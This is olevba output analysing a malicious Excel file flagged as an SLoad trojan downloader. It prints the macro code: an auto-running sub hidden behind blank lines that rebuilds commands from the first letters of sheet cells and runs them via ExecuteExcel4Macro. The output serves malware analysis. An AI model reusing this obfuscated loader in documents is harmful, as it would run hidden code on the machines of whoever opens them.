olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan-Downloader.MSOffice.SLoad.gen-07d3706714e1bdb0930017f1621c494ebaa1c64ada4ab7e0bac83f9005a05738
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO Questa_cartella_di_lavoro.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Questa_cartella_di_lavoro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Foglio1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub tostampa()
sstampa = Application.Dialogs(xlDialogPrinterSetup).Show
If sstampa <> False Then Range("A2:J" & LTrim(Str(lastrow))).PrintOut
End Sub
Function iiif(u, ii, ui, O As String)
d = Replace(O, "!", u): md = Replace(d, "%", ii): iiif = Replace(md, "?", ui)
End Function
Sub vizz(Nulll As String)
Debug.Print ExecuteExcel4Macro(Nulll), 0
End Sub

Public Function NN(k As Integer) As String
For j = 1 To k
be = Int((122 - 65 + 1) * Rnd + 65)
Do While be > 90 And be < 97
be = Int((122 - 65 + 1) * Rnd + 65)
Loop
NN = NN & Chr(be)
Next
End Function

Sub stampa2()
Dim q As Integer: q = 7
ju = NN(8): Uj = NN(q)
iUj = NN(q) & "."
For Each kp In ActiveSheet.UsedRange.SpecialCells(xlCellTypeConstants): b = b & Left(kp.Text, 1): Next
hh = Split(b, ";")
For Each h In hh
vizz (iiif(ju, Uj, iUj, CStr(h)))
Next
End Sub




























Private Sub stampa_Layout()
Colors = 16: stampa2
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |stampa_Layout       |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|ExecuteExcel4Macro  |May run an Excel 4 Macro (aka XLM/XLF) from  |
|          |                    |VBA                                          |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

